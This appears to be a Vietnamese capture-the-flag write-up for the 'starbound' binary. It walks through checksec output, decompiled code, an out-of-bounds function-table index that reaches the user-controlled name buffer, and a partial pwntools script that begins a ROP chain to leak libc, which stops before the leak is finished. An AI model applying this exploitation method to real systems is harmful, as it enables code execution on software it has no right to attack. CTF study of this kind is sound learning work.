## starbound
___
### Thông tin file:

```c
└─$ file starbound
starbound: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5a960d92ab1e8594d377bd96eb6ea49980f412a9, not stripped
```
```c
└─$ checksec --file=starbound
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   151 Symbols  Yes   4               8               starbound
```
* `Partial RELRO`: có thể overwrite GOT
* `No pie`: địa chỉ trong binary là cố định

Để chạy được file, ta dùng patchelf:
```c
└─$ ls                                
libcrypto.so.1.0.0  starbound
```
```c
└─$ patchelf --set-rpath . ./starbound
```

Output file:

<img width="821" height="580" alt="image" src="https://github.com/user-attachments/assets/8a90a8bb-dfde-476e-8570-54982f7805e1" />

____
### Code từ ghidra:

`main()`:
```c
undefined4 main(void)
{
  int len;
  long idx;
  EVP_PKEY_CTX *in_stack_fffffee0;
  char buffer [264];
  
  init(in_stack_fffffee0);
  while( true ) {
    alarm(60);
    (*_main_menu)();
    len = readn(buffer,256);
    if (len == 0) break;
    idx = strtol(buffer,(char **)0x0,10);
    if (idx == 0) break;
    (*(code *)(&commands)[idx])();
  }
  do_bye();
  return 0;
}
```
* `(*_main_menu)()` là menu của minigame:
  ```c
  void cmd_go_back(void)  // từ init(...)
  {
    _main_menu = show_main_menu;
    return;
  }
  ```
  ```c
  void show_main_menu(void)
  {
    int i;
    
    puts("\n-+STARBOUND v1.0+-");
    puts("  0. Exit");
    puts("  1. Info");
    puts("  2. Move");
    puts("  3. View");
    puts("  4. Tools");
    puts("  5. Kill");
    puts("  6. Settings");
    puts("  7. Multiplayer");
    printf(1,&DAT_0804a792);
    for (i = 0; i < 10; i = i + 1) {
      (&commands)[i] = cmd_nop;
    }
    _DAT_08058158 = cmd_info;
    _DAT_0805815c = cmd_move;
    _DAT_08058160 = cmd_view;
    _DAT_08058164 = cmd_build;
    _DAT_08058168 = cmd_kill;
    _DAT_0805816c = cmd_settings;
    _DAT_08058170 = cmd_multiplayer;
    return;
  }
  ```
  <img width="784" height="128" alt="image" src="https://github.com/user-attachments/assets/f7e7cede-9b66-43d6-be7b-f374b5737f02" />

* `readn(buffer,256);`: đọc input từ user với menu trên thông qua:
  ```
  >
  ```

* `strtol(buffer,(char **)0x0,10)`: chuyển input sang dạng số (long int)

* `(*(code *)(&commands)[idx])();`: dựa vào input, thì thực thi function tại index đấy, bao gồm
  ```c
    _DAT_08058158 = cmd_info;
    _DAT_0805815c = cmd_move;
    _DAT_08058160 = cmd_view;
    _DAT_08058164 = cmd_build;
    _DAT_08058168 = cmd_kill;
    _DAT_0805816c = cmd_settings;
    _DAT_08058170 = cmd_multiplayer;
  ```
  vì chỉ có 1 check là `idx = 0`, nên có khả năng out of bound

Bên cạnh đấy trong otption `cmd_settings` có:
```c
void show_settings_menu(void)
{
  int indx;
  
  if (DAT_080580cc != 0) {
    cmd_view();
  }
  puts("\n-+STARBOUND v1.0: SETTINGS+-");
  puts("  0. Exit");
  puts("  1. Back");
  puts("  2. Name");
  puts("  3. IP");
  puts("  4. Toggle View");
  printf(1,&DAT_0804a792);
  for (indx = 0; indx < 10; indx = indx + 1) {
    (&commands)[indx] = cmd_nop;
  }
  _DAT_08058158 = cmd_go_back;
  _DAT_0805815c = cmd_set_name;
  _DAT_08058160 = cmd_set_ip;
  _DAT_08058164 = cmd_set_autoview;
  return;
}
```
```c
void cmd_set_name(void)
{
  int len;
  
  printf(1,"Enter your name: ");
  len = readn(&name,100);
  *(undefined1 *)((int)&DAT_080580cc + len + 3) = 0;
  return;
}
```
* `readn(&name,100);`: đọc 100 bytes vào biến global `name`

==> Có thể nhét payload tạm vào phần memoery này, và tận dụng lỗ hổng out of bound trên đến thực thi payload tại vị trí memory này. 

Vì binary file có **NX enabled**, nên không dùng shellcode cho payload. Mà thay vào đó dùng ROP.

Tìm kiếm gadgets có sẵn từ binary:
```c
└─$ ropper --file starbound | grep "pop"
```
```asm
0x080494dc: pop edi; ret; 
0x080494db: pop esi; pop edi; ret; 
0x080499ef: pop esi; ret;
0x08048922: ret;
```
Hình như không khả dụng vì chương trình chạy 32-bit hoạt động kiểu khác

### Khai thác:
Trước hết, tính index của `name` (nơi chứa payload)
* name:
  
<img width="362" height="118" alt="image" src="https://github.com/user-attachments/assets/87a7b2de-ef90-4f9c-8046-ab09e5482314" />

* command:

<img width="427" height="464" alt="image" src="https://github.com/user-attachments/assets/e841de62-59a6-4a55-ba67-ead55b3c2032" />

```c
# Thấy mỗi function chiếm 4 bytes
offset = (08058154 - 080580d0) / 4
       = 33
# Nhưng mà vì `name` đứng trước `command` nên offset sẽ là:
offset = -33
```

Để vào option viết vào `name`:
```python
p.recvuntil(b"> ")
p.sendline(b"6")
p.recvuntil(b"> ")
p.sendline(b"2")

p.sendlineafter(b"Enter your name: ", b"AAAA")

p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b"> ")
p.sendline(b"-33")
```
Ta thử xem hướng exploit đúng ko:

* Phần memory tại `name`:  

<img width="799" height="109" alt="image" src="https://github.com/user-attachments/assets/0cfc2ad3-772e-46bb-9e78-155dde1257cf" />

* Với index = `-33`, ta có trỏ đến vùng `name`:

<img width="816" height="692" alt="image" src="https://github.com/user-attachments/assets/8d39853f-bc5b-41d9-acf9-5f51b7f1ddbe" />

==> Có thể khả thi

Giờ đến bước leak libc và dựng ROP:

____
script.py:

```python
from pwn import *

context.binary = exe = ELF("./starbound", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br main
		br *main + 58

		x/4gx 0x080580d0
		''')

p = process(exe.path)
GDB()

p.recvuntil(b"> ")
p.sendline(b"6")
p.recvuntil(b"> ")
p.sendline(b"2")

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_addr = 0x0804a61b

payload = p32(puts_plt) + p32(main_addr) + p32(puts_got)
p.sendlineafter(b"Enter your name: ", payload)

p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b"> ")
p.sendline(b"-33")

p.recvuntil(b"> ") 
# leak_raw = p.recv(4)
# leak = u32(leak_raw)

# print(f"leak: {hex(leak)}")

p.interactive()
```

___






